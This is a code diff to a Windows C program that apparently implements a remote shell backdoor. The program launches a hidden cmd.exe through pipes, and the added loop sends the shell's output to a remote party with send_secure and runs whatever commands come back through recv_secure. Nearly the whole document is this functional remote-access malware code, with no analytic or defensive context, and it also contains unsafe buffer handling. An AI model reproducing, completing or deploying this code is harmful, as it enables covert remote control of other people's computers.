@@ -35,8 +35,8 @@
 	 HANDLE hcstdin_rd;
 	 HANDLE hcstdin_wr;
 	 BYTE* sendBuff = malloc(4096);
-	 ZeroMemory(sendBuff,4096);
 	 BYTE buffer[4096];
+	 BYTE* Command;
 	 DWORD bytesRead=0;
 	 /*
 	  * create an anonomous pipe
@@ -59,7 +59,7 @@
 	 si.wShowWindow = SW_HIDE;
 	 PROCESS_INFORMATION pi = {};
 	 BYTE PAYLOAD[] = {"C:\\Windows\\System32\\cmd.exe"};
-	 if(!CreateProcessA(NULL,PAYLOAD /*"C:\\Windows\\System32\\cmd.exe "*/,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si, &pi))
+	 if(!CreateProcessA(NULL,PAYLOAD,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si, &pi))
 	 {
 		 printf("%d",GetLastError());
 		return -1;
@@ -81,26 +81,39 @@
 	  * 3 newline
 	  * 4 prompt
 	  */ 
-	
+	for(;;)
+	{	 
+		ZeroMemory(sendBuff,4096);
+		ZeroMemory(buffer,4096);
 		DWORD bw;
 		DWORD tba;
-	do
-	{
-		if(!ReadFile(hcstdout_rd,buffer,4096,&bytesRead,NULL))
+		DWORD wr;
+		do
+		{	
+			if(!ReadFile(hcstdout_rd,buffer,4096,&bytesRead,NULL))
+				{
+					printf("read failed: %d", GetLastError());
+					return -1;
+				}
+			printf("here> %s",buffer);
+			if(!PeekNamedPipe(hcstdout_rd,NULL,4096,&bw,&tba,NULL))
 			{
-				printf("read failed: %d", GetLastError());
+				printf("here");
 				return -1;
 			}
-		if(!PeekNamedPipe(hcstdout_rd,NULL,4096,&bw,&tba,NULL))
+			sprintf(sendBuff, "%s%s",sendBuff,buffer);	
+		} while(bw != 0) ;
+//		printf("%s",sendBuff);
+		send_secure(sendBuff,strlen(sendBuff));
+		Command = recv_secure();
+		if(!WriteFile(hcstdin_wr,strcat(Command,"\n"),strlen(Command)+1,&wr,NULL))
 		{
-			printf("here");
+				
+			printf("something fucked up");
 			return -1;
 		}
-	 	sprintf(sendBuff, "%s%s",sendBuff,buffer);
-		
-	} while(bw != 0) ;
-	send_secure(sendBuff,strlen(sendBuff));
-	printf("%s",sendBuff);
+		sleep(1);
+	}
 	 /*
 	  * BYTE* tmp = "hello";
 	send_secure(tmp,5);
